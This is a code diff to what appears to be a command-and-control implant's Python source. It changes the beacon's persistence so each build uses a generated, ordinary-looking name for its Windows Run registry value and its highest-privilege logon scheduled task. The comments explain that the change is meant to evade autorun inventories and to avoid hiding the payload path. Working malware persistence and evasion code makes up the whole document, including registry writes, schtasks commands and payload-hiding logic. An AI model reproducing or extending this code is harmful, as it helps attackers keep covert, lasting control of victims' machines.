@@ -3975,6 +3975,46 @@ def _decoy_fields(n: int) -> dict:
     return {k: pool[k]() for k in keys}
 
 
+# ── Persistence names ──
+#
+# One name per build, generated rather than fixed. The HKCU `Run` value
+# and the scheduled task used to be one literal written identically in
+# every deployment, so a single burned engagement burned the name for
+# every deployment that followed it.
+#
+# Ordinary administrative vocabulary on purpose: the only place this name
+# is ever read is an autorun inventory, where the thing that draws an eye
+# is a name that belongs to nothing. The trailing hex is what makes two
+# builds differ -- two words alone would collide across an engagement.
+_PERSIST_WORDS = ("Device", "Display", "Network", "Printer", "Credential",
+                  "Policy", "Session", "Storage", "Telemetry", "Update")
+_PERSIST_ROLES = ("Host", "Agent", "Broker", "Helper", "Manager", "Service",
+                  "Sync", "Worker")
+
+
+def persistence_name(entropy: bytes) -> str:
+    """One build's autorun entry name, derived from `entropy`.
+
+    Two callers, one shape. The generator passes `os.urandom`, so every
+    build it issues carries its own name in its config block. `Beacon`
+    passes bytes derived from its implant id when a config carries no
+    persistence block at all, because that answer has to be the same on
+    every run of one artifact on one host -- otherwise an `unpersist`
+    would go looking for a name no `persist` ever wrote.
+
+    Four bytes at least. A caller with fewer thought it was passing
+    something random and was not, and the name it would get back would be
+    the same one every other such caller got.
+    """
+    if len(entropy) < 4:
+        raise ValueError(
+            "persistence_name needs at least 4 bytes of entropy, got %d: "
+            "fewer than that is not a per-build name" % len(entropy))
+    return "%s%s%s" % (_PERSIST_WORDS[entropy[0] % len(_PERSIST_WORDS)],
+                       _PERSIST_ROLES[entropy[1] % len(_PERSIST_ROLES)],
+                       entropy[2:4].hex())
+
+
 class Beacon:
     """C2 beacon with AES-GCM encryption and network evasion."""
 
@@ -4045,6 +4085,31 @@ class Beacon:
         # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
         # thread owns the process, so the two meet over this.
         self._tunnel_lock = threading.Lock()
+
+        # Persistence: one generated name per build, carried in the config
+        # block, so `_exec_persist` and `_exec_unpersist` read one value
+        # rather than each holding its own copy of a literal. The name an
+        # install wrote is by construction the name a removal looks for.
+        persist_cfg = c2.get("persistence") or {}
+        # No block means a config file rather than a generated build.
+        # Derived from the implant id, which is stable for the life of a
+        # host, and not from a literal -- a literal here would be the
+        # thing this field exists to remove. The id is `_generate_id`'s
+        # hex digest, so its own bytes are the entropy: beacon.py's hash
+        # call sites are an allow-list in the hardening tests, on purpose,
+        # and a name needs no hash of its own.
+        self._persist_name = persist_cfg.get("name") or persistence_name(
+            bytes.fromhex(self._implant_id[:8]))
+        # `path` keeps the payload's path on the autorun command line;
+        # `argc` leaves it off and lets the hook in a brought
+        # interpreter's own `Lib/` find the payload. Anything else is a
+        # build from a newer generator than this artifact, and `path` is
+        # the answer that still works without a hook. See
+        # `render_sitecustomize` in server.py for why `path` is the
+        # default rather than the quieter-looking one.
+        gate = persist_cfg.get("gate")
+        self._persist_gate = gate if gate in ("path", "argc") else "path"
+        self._persist_payload = persist_cfg.get("payload_name") or ""
 
         # A launcher that runs on the drop-box says so; the Raccoon config on
         # disk is the independent second signal (see _probe_dropbox).
@@ -6151,14 +6216,50 @@ class Beacon:
 
     # ── Persistence ──
 
+    def _bundled_payload(self) -> str:
+        """This build's payload beside this interpreter, or "".
+
+        Non-empty means the interpreter running us is one we brought: the
+        stager lays the payload out next to it and the startup hook in
+        its own `Lib/` beside that. That is the only situation in which
+        the hook exists, so it is the only situation in which the `argc`
+        gate can be allowed to drop the payload's path from an autorun
+        command line.
+        """
+        if not self._persist_payload:
+            return ""
+        candidate = os.path.join(
+            os.path.dirname(os.path.abspath(sys.executable)),
+            self._persist_payload)
+        return candidate if os.path.isfile(candidate) else ""
+
     def _get_beacon_path(self) -> str:
+        """The payload path an autorun entry should name, or "" for none.
+
+        "" is a supported answer and means the entry needs no path: under
+        the `argc` gate, with a payload beside an interpreter we brought,
+        the hook in that interpreter's `Lib/` finds the payload itself and
+        the command line carries nothing to find.
+
+        Otherwise the bundled payload if there is one, and `sys.argv[0]`
+        if there is not -- which is the one thing this project ships as
+        `python3 -c '<blob>'`, where `sys.argv[0]` is the literal "-c"
+        and the answer is useless. A build that brought an interpreter is
+        exactly the build that can do better, so it does.
+        """
+        bundled = self._bundled_payload()
+        if bundled:
+            return "" if self._persist_gate == "argc" else bundled
         return os.path.abspath(sys.argv[0])
 
     def _exec_persist(self, method: str) -> str:
         method = (method or "auto").strip().lower()
         beacon_path = self._get_beacon_path()
         python_path = sys.executable
-        cmd_line = f"{python_path} {beacon_path}"
+        # No path to name: the startup hook is what finds the payload.
+        cmd_line = ("%s %s" % (python_path, beacon_path) if beacon_path
+                    else python_path)
+        name = self._persist_name
 
         if method == "auto":
             method = "registry" if platform.system() == "Windows" else "crontab"
@@ -6173,9 +6274,9 @@ class Beacon:
                     r"Software\Microsoft\Windows\CurrentVersion\Run",
                     0, winreg.KEY_SET_VALUE,
                 )
-                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, cmd_line)
+                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd_line)
                 winreg.CloseKey(key)
-                return f"Persistence installed: HKCU\\...\\Run\\SystemHealthMonitor\n{cmd_line}"
+                return f"Persistence installed: HKCU\\...\\Run\\{name}\n{cmd_line}"
 
             elif method == "startup":
                 if platform.system() != "Windows":
@@ -6192,12 +6293,12 @@ class Beacon:
                 if platform.system() != "Windows":
                     return "[error] Scheduled task persistence only available on Windows"
                 result = subprocess.run(
-                    ["schtasks", "/create", "/tn", "SystemHealthMonitor",
+                    ["schtasks", "/create", "/tn", name,
                      "/tr", cmd_line, "/sc", "onlogon", "/rl", "highest", "/f"],
                     capture_output=True, text=True, timeout=15,
                 )
                 if result.returncode == 0:
-                    return f"Persistence installed: schtask SystemHealthMonitor\n{result.stdout.strip()}"
+                    return f"Persistence installed: schtask {name}\n{result.stdout.strip()}"
                 return f"[error] {result.stderr.strip()}"
 
             elif method == "crontab":
@@ -6256,6 +6357,8 @@ class Beacon:
 
     def _exec_unpersist(self, method: str) -> str:
         method = (method or "auto").strip().lower()
+        # The same value `_exec_persist` wrote, read from the same place.
+        name = self._persist_name
         if method == "auto":
             method = "registry" if platform.system() == "Windows" else "crontab"
 
@@ -6268,7 +6371,7 @@ class Beacon:
                     0, winreg.KEY_SET_VALUE,
                 )
                 try:
-                    winreg.DeleteValue(key, "SystemHealthMonitor")
+                    winreg.DeleteValue(key, name)
                 except FileNotFoundError:
                     return "No registry persistence found"
                 finally:
@@ -6285,7 +6388,7 @@ class Beacon:
 
             elif method == "schtask":
                 result = subprocess.run(
-                    ["schtasks", "/delete", "/tn", "SystemHealthMonitor", "/f"],
+                    ["schtasks", "/delete", "/tn", name, "/f"],
                     capture_output=True, text=True, timeout=15,
                 )
                 return result.stdout.strip() or result.stderr.strip() or "Scheduled task removed"
